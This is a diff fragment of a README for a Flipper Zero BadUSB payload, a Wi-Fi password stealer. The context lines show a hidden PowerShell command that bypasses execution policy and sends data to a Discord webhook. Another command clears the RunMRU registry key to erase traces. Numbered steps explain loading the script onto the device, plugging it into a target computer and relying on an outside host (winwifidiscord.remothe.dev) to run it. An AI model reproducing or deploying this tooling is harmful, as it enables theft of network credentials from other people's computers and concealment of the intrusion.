@@ -23,7 +23,7 @@ powershell -w h -ep bypass $discord='https://discord.com/api/webhooks/<channel_i
 powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue" | iex
 ```
 
-### Flipper Zero
+### Executing program | Flipper Zero
 1. Copy the `Wifi-Stealer-Discord_Quick.txt` file to the Flipper Zero in the `badusb` folder, directly to the microSD card or using the [Flipper Zero app](https://docs.flipperzero.one/mobile-app) *(Android/iOS)* or [qFlipper](https://docs.flipperzero.one/qflipper) *(Windows/Linux/MacOS)*
 2. Plug the Flipper Zero to the target computer
 3. You must have internet access in order for the .txt file's script in order to connect to the last bit `winwifidiscord.remothe.dev` and allow it to execute.
